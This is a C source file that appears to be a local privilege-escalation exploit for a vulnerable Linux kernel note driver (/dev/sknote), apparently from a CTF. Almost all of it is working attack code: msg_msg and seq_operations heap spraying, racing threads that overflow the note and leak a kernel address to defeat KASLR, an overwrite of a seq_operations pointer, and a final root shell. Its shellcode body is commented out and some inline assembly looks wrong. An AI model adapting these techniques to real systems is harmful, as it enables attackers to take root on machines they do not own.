#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>

// commands
#define DEV_PATH "/dev/sknote" // the path the device is placed
#define MAX_NOTE_SIZE 0x400

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4 * PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void *)0
#define errExit(msg)    \
  do                    \
  {                     \
    perror(msg);        \
    exit(EXIT_FAILURE); \
  } while (0)
#define KMALLOC(qid, msgbuf, N)   \
  for (int ix = 0; ix != N; ++ix) \
  {                               \
    if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
    errExit("KMALLOC"); \
  }
ulong user_cs, user_ss, user_sp, user_rflags;
struct pt_regs
{
  ulong r15;
  ulong r14;
  ulong r13;
  ulong r12;
  ulong bp;
  ulong bx;
  ulong r11;
  ulong r10;
  ulong r9;
  ulong r8;
  ulong ax;
  ulong cx;
  ulong dx;
  ulong si;
  ulong di;
  ulong orig_ax;
  ulong ip;
  ulong cs;
  ulong flags;
  ulong sp;
  ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  execve("/bin/sh", argv, envp);
}
// should compile with -masm=intel
static void save_state(void)
{
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
      :
      : "memory");
}

unsigned long (*rooter_pkc)(unsigned long) = 0;
unsigned long (*rooter_commit_creds)(unsigned long) = 0;

int shellcode_is_called = 0;

static void shellcode(void)
{
  //asm(
  //    "xor rdi, rdi\n"
  //    "mov rbx, QWORD PTR [rsp+0x50]\n"
  //    "sub rbx, 0x244566\n"
  //    "mov rcx, rbx\n"
  //    "call rcx\n"
  //    "mov rdi, rax\n"
  //    "sub rbx, 0x470\n"
  //    "call rbx\n"
  //    "add rsp, 0x20\n"
  //    "pop rbx\n"
  //    "pop r12\n"
  //    "pop r13\n"
  //    "pop r14\n"
  //    "pop r15\n"
  //    "pop rbp\n"
  //    "ret\n");
  //save_state();

  //shellcode_is_called = 1;
  //rooter_commit_creds(rooter_pkc(0));
}
// (END utils)

// globals
const unsigned PSIZE = 10;
int fd = 0;
const ulong ADDRBASE = 0x10000;
int write_permission = 0;
long target_offset = 0;
typedef struct
{
  int whoami;
  long uffd;
} thrinfo;
char EMPTYNOTE[PAGE];
// (END globals)

ulong sk_seek_abs(unsigned abs)
{
  assert(fd != 0);
  ulong hoge = lseek(fd, abs, SEEK_SET);
  if (hoge == -1)
  {
    errExit("lseek");
  }
  return hoge;
}

void sk_seek_zero(void)
{
  sk_seek_abs(0);
}

ulong sk_seek_end(void)
{
  assert(fd != 0);
  return lseek(fd, 0, SEEK_END);
}

int SHOULDEND = 0;

#define REPEAT 80

static void *writer(void *arg)
{
  //int whoami = *(int*)arg;
  //printf("[.] writer inited: %d\n", whoami);

  assert(fd != 0);
  ulong cur;
  char buf[PAGE] = {0};
  ulong old = MAX_NOTE_SIZE;
  while (1 == 1)
  {
    cur = sk_seek_end();
    if(cur != old) {
      printf("[+] extended to 0x%lx : %lx\n", cur, cur / MAX_NOTE_SIZE);
      old = cur;
    }
    if (cur > MAX_NOTE_SIZE * REPEAT)
    {
      printf("[SEEK_END] %lx\n", cur);
      puts("!!!!!!!!!!!!!!!!!!!!!!!!!!");
      SHOULDEND = 1;
      return 0;
    }
    int ret = write(fd, buf, MAX_NOTE_SIZE);
  }
  printf("[.] writer finished\n");
}

static void *zeroer(void *arg)
{
  assert(fd != 0);
  while (SHOULDEND == 0)
  {
    sk_seek_zero();
  }
  return 0;
}

static void *targeter(void *arg) {
  while (SHOULDEND == 0) {
    sk_seek_abs(target_offset);
  }
  printf("[.] targeter finished\n");
}

static void *writer2(void *arg) {
  ulong cur;
  ulong value = ((ulong)shellcode) + 4;
  ulong written_value[4] = {value, value, value, value};
  ulong old = MAX_NOTE_SIZE;
  while (SHOULDEND == 0)
  {
    sk_seek_zero();
    int ret = write(fd, written_value, 8 * 4);
  }
  printf("[.] writer2 finished\n");
}

void print_curious(char *buf, size_t size)
{
  for (int ix = 0; ix != size / 8; ++ix)
  {
    long hoge = *((ulong *)buf + ix);
    if (hoge != 0)
    {
      printf("[+%x] %lx\n", ix * 8, hoge);
    }
  }
}

unsigned long find_signature(char *buf, size_t size) {
  unsigned signatures[4] = {0xa0, 0xc0, 0xb0, 0x20};
  int step = 0;
  for (int ix = 0; ix != size / 8; ++ix)
  {
    long hoge = *((ulong *)buf + ix);
    if((hoge&0xFF) == signatures[step]) {
      ++step;
    } else {
      step = 0;
    }
    if(step == 4) {
      return (ix - 3) * 8;
    }
  }
  return 0;
}

struct _msgbuf400
{
  long mtype;
  char mtext[0x400];
};

int main(int argc, char *argv[])
{
  printf("[.] shellcode @ %p\n", shellcode);
  pthread_t writer_thr, zeroer_thr;
  memset(EMPTYNOTE, 'A', MAX_NOTE_SIZE * 2);

  // heap spray
  puts("[.] heap spraying...");
  for (int jx = 0; jx != 0x100; ++jx) {
    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (qid == -1)
    {
      errExit("msgget");
    }
    struct _msgbuf400 msgbuf = {.mtype = 1};
    memset(msgbuf.mtext, 'A', 0x400);
    KMALLOC(qid, msgbuf, 0x10);
  }
  puts("[.] END heap spraying");

  // init
  if ((fd = open(DEV_PATH, O_RDWR)) < 0)
  {
    errExit("open");
  }
  puts("[.] opened dev file.");

  // alloc seq_operations next to NOTE
  puts("[.] seq spraying...");
  #define SEQSIZE 0x300
  int seq_fds[SEQSIZE];
  for (int ix = 0; ix != SEQSIZE; ++ix)
  {
    if((seq_fds[ix] = open("/proc/self/stat", O_RDONLY)) == -1) {
      errExit("open seq");
    }
  }
  puts("[.] END seq spraying...");

  // first write
  puts("[.] first write");
  assert(write(fd, EMPTYNOTE, MAX_NOTE_SIZE) != -1);

  // init threads
  puts("[.] writer thread initing...");
  assert(pthread_create(&writer_thr, NULL, writer, (void *)0) == 0);
  puts("[.] zeroer thread initing...");
  assert(pthread_create(&zeroer_thr, NULL, zeroer, (void *)0) == 0);

  pthread_join(writer_thr, NULL);

  // leek
  sleep(1);
  char buf[REPEAT * PAGE] = {0};
  sk_seek_zero();
  if (read(fd, buf, REPEAT * MAX_NOTE_SIZE) == -1)
  {
    errExit("read");
  }

  //print_curious(buf, REPEAT * MAX_NOTE_SIZE);
  target_offset = find_signature(buf, REPEAT * MAX_NOTE_SIZE);
  if (target_offset == 0) {
    errExit("target not found...");
  }
  printf("[!] target found @ offset 0x%lx\n", target_offset);
  print_curious(buf + target_offset, 8 * 8);

  ulong single_start = *(ulong *)(buf + target_offset);
  ulong kernbase = single_start - 0x16e1a0;
  ulong pkc = (0xffffffff810709f0 - 0xffffffff81000000) + kernbase;
  ulong commit_creds = (0xffffffff81070860 - 0xffffffff81000000) + kernbase;
  printf("[!] single_start: 0x%lx\n", single_start);
  printf("[!] kernbase: 0x%lx\n", kernbase);
  printf("[!] pkc: 0x%lx\n", pkc);
  printf("[!] commit_creds: 0x%lx\n", commit_creds);

  rooter_pkc = pkc;
  rooter_commit_creds = commit_creds;

  // overwrite
  printf("[+] overwrite as %lx\n", shellcode);
  ulong value = (ulong)shellcode;
  SHOULDEND = 0;

  puts("[.] writer thread initing...");
  assert(pthread_create(&writer_thr, NULL, writer2, (void *)0) == 0);
  puts("[.] targeter thread initing...");
  assert(pthread_create(&zeroer_thr, NULL, targeter, (void *)0) == 0);
  puts("[...] waiting lack...");
  sleep(3);
  SHOULDEND = 1;

  sk_seek_abs(target_offset);
  long nowvictim = 0;
  assert(read(fd, &nowvictim, 8) != -1);
  if(nowvictim == single_start) {
    printf("[-] failed to overwrite...\n");
    errExit(0);
  } else {
    printf("[!!] overwrite success!! : 0x%lx\n", nowvictim);
  }

  //print_curious(buf, MAX_NOTE_SIZE * REPEAT);


  //ulong cur = sk_seek_abs(target_offset);
  //printf("[+] cur: %lx\n", cur);
  //for (int ix = 0; ix != 4; ++ix)
  //{
  //  if(write(fd, &value, 8) == -1) {
  //    puts("fail");
  //    WAIT;
  //    errExit("write");
  //  }
  //}

  // invoke shellcode
  puts("[.] reading seqs");
  char hoge[0x10];
  for (int ix = 0; ix != SEQSIZE; ++ix)
  {
    if(read(seq_fds[ix], hoge, 1) == -1) {
      errExit("seq read");
    }
  }

  if(shellcode_is_called == 0) {
    errExit("shellcode is not called");
  }

  puts("[+] executing NIRUGIRI...");
  NIRUGIRI();

  // end of life
  puts("[ ] END exploit.");

  return 0;
}
